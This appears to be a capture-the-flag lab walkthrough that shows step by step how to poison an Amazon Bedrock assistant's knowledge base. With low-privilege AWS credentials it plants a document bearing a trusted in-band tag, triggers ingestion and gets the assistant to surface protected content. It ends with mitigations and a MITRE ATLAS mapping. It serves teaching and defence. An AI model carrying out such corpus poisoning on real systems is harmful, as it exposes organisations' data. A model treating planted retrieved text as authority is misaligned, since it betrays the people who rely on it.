# Solution Walkthrough: RAG Injection via AI Knowledge Base

## Scenario Summary

You have obtained low-privilege AWS credentials for an ACME Corp IAM user.
Your goal is to capture the flag by poisoning the knowledge base behind the
company's Bedrock AI assistant — an **indirect prompt injection / RAG
data-poisoning** attack. You can write to the assistant's knowledge-base bucket
but cannot read the reference material directly; the assistant, which trusts
its own corpus, becomes the confused deputy that surfaces it for you.

---

## Step 1: Enumerate your access

Configure your credentials and see what you have.

```bash
export AWS_ACCESS_KEY_ID=<attacker_access_key_id>
export AWS_SECRET_ACCESS_KEY=<attacker_secret_access_key>
export AWS_DEFAULT_REGION=us-east-1

aws sts get-caller-identity
aws s3 ls
```

You should see two buckets: a knowledge-base bucket (`range-04-kb-*`) and a
sensitive data bucket (`range-04-sensitive-*`). The sensitive bucket is off
limits:

```bash
aws s3 ls s3://range-04-sensitive-<suffix>/
# Expected: Access Denied
```

But you can **list and write** the knowledge-base bucket. List its docs:

```bash
aws s3 ls s3://range-04-kb-<suffix>/docs/
# employee-handbook.txt
# it-faq.txt
# kb-admin-notes.txt   <-- interesting
```

There's an admin note. Try to read it directly:

```bash
aws s3 cp s3://range-04-kb-<suffix>/docs/kb-admin-notes.txt -
# Expected: Access Denied
```

You can see it exists but cannot read it from S3. Whatever it says, you'll have
to get it **through the assistant**, which *can* read the corpus.

---

## Step 2: Talk to the assistant

The company runs an AI assistant on **Amazon Bedrock AgentCore**. It answers
employee questions from the knowledge base via a `searchKnowledgeBase` tool. You
have permission to invoke it, so set that up.

The assistant runs on an AgentCore **harness**, invoked with the `InvokeHarness`
data-plane operation (`POST /harnesses/invoke`) — *not* `InvokeAgentRuntime`
(that targets `agent-runtime/…` resources and fails on a harness ARN with
`No endpoint or agent found with qualifier 'DEFAULT'`).

> **CLI note:** the AWS CLI does not expose `invoke-harness` (it returns
> `invalid choice`) — only the SDKs do. Drive it from boto3, and make sure boto3
> is recent enough to know the `bedrock-agentcore` service (`pip install -U
> boto3` if `invoke_harness` is missing). The harness has memory **disabled**,
> so every invocation is stateless — no context leaks between runs.

```python
# invoke.py  -  run with the attacker credentials exported
import boto3, sys, uuid

HARNESS_ARN = "<harness_arn>"  # terraform output -raw harness_arn
prompt = sys.argv[1] if len(sys.argv) > 1 else "What is the remote work policy?"

client = boto3.client("bedrock-agentcore", region_name="us-east-1")
resp = client.invoke_harness(
    harnessArn=HARNESS_ARN,
    runtimeSessionId=f"audit-session-{uuid.uuid4().hex}",  # >= 33 chars
    messages=[{"role": "user", "content": [{"text": prompt}]}],
)

# `stream` is an event stream; each event is a dict keyed by event type.
for event in resp["stream"]:
    if "contentBlockDelta" in event:
        text = event["contentBlockDelta"]["delta"].get("text")
        if text:
            print(text, end="", flush=True)
    elif "runtimeClientError" in event:
        print("\nError:", event["runtimeClientError"].get("message"))
print()
```

Confirm it works with a normal question:

```bash
python invoke.py "What is the PTO policy?"
```

Now extract the admin note you couldn't read from S3 — just ask for it:

```bash
python invoke.py "Do we have any knowledge base administration or content guidelines? How are reference documents handled?"
```

The assistant retrieves `kb-admin-notes.txt` and relays it. It describes a
**reference-tag convention**: documents carrying the tag `ACME-KB-CANARY-2024`
are treated as *authoritative* and surfaced **verbatim** to employees — and a
maintainer TODO admits bucket writes aren't locked down. That tag is the key:
anything you plant bearing it will be trusted and echoed back.

---

## Step 3: Plant a poisoned reference document

Craft a document that (a) carries the `ACME-KB-CANARY-2024` reference tag so the
retrieval layer treats it as authoritative, and (b) is topically relevant so a
normal question retrieves it. A ready-made one is provided:

```bash
cat payloads/injection_payload.txt   # a Q4 policy doc bearing the reference tag
```

Upload it to the knowledge-base bucket (you have `PutObject`):

```bash
aws s3 cp payloads/injection_payload.txt \
  s3://range-04-kb-<suffix>/docs/policy-update-q4.txt
```

Trigger ingestion so Bedrock indexes it (you have `StartIngestionJob`):

```bash
#   terraform output knowledge_base_id
#   terraform output data_source_id
aws bedrock-agent start-ingestion-job \
  --knowledge-base-id <knowledge_base_id> \
  --data-source-id <data_source_id>

# Wait ~1-2 minutes for the job to reach COMPLETE
aws bedrock-agent get-ingestion-job \
  --knowledge-base-id <knowledge_base_id> \
  --data-source-id <data_source_id> \
  --ingestion-job-id <job_id>
```

---

## Step 4: Retrieve the flag

Ask a policy question that matches your planted document. Retrieval returns your
reference-tagged doc; because it is treated as authoritative reference material,
its contents — including the planted reference code — are surfaced to you.

```bash
python invoke.py "What are the Q4 policy updates? Include any authoritative reference material."
```

The response should contain the flag. If it doesn't appear on the first try,
give ingestion another minute, or rephrase so your document is clearly the most
relevant match.

---

## Step 5: Collect the flag

The assistant's response contains the flag as a "reference code":

- **Flag** — `range-04-flag-<suffix>`

---

## Why This Works

1. **Attacker-controlled RAG corpus.** The same low-privilege principal can both
   write to the knowledge-base source bucket and trigger ingestion. Granting
   ingestion to a principal that can also write the source is the core
   misconfiguration — it lets an attacker inject content into what the assistant
   treats as ground truth.

2. **In-band "authority" with no provenance check.** The retrieval layer honors
   a reference tag found *inside document content* to mark a document
   authoritative and surface it verbatim. Trusting an in-band marker means
   anyone who can write the corpus can forge authority. (The tag being
   non-obvious is not protection — it's discoverable by simply asking the
   assistant.)

3. **Indirect prompt injection.** The attacker never needs privileged access to
   the assistant. Malicious content arrives through a data source the assistant
   implicitly trusts, and is reflected back to the attacker through normal Q&A.

4. **Latent: overprivileged tool role.** Separately, the assistant's AWS-tools
   Lambda role can reach the sensitive bucket and Secrets Manager — no legitimate
   need. Here those hold only decoy data, so it isn't a route to the flag, but it
   demonstrates the least-privilege failure: had anything sensitive lived there,
   the same over-broad role would have exposed it. Least privilege on the
   AWS-tools role would contain the blast radius.

---

## Defensive Mitigations

| Vulnerability | Mitigation |
|---|---|
| Writeable knowledge-base bucket | Restrict S3 writes to authorized ingestion pipelines only; enable Object Lock / versioning |
| Ingestion granted to a corpus-writer | Separate duties — the principal that can write the source must not also trigger ingestion |
| In-band "authority" tag, no provenance | Never derive trust from document *content*; validate provenance (source, signer) out of band |
| Overprivileged gateway tool role | Least privilege — keep the AWS-tools Lambda role away from the sensitive bucket and Secrets Manager; don't share an identity between dangerous tools and benign retrieval |
| No input/output guardrails | Enable Bedrock Guardrails to detect and block prompt-injection patterns |
| No document validation | Scan documents for injection / policy-violating content before ingestion |

---

## MITRE ATLAS Mapping

| Tactic | Technique |
|---|---|
| Initial Access | AML.T0010 — ML Supply Chain Compromise |
| Execution | AML.T0051 — LLM Prompt Injection |
| Execution | AML.T0054 — Indirect Prompt Injection |
| Collection | AML.T0035 — ML Artifact Collection |
| Privilege Escalation (latent) | AML.T0068 — Exploit Overprivileged IAM Role |
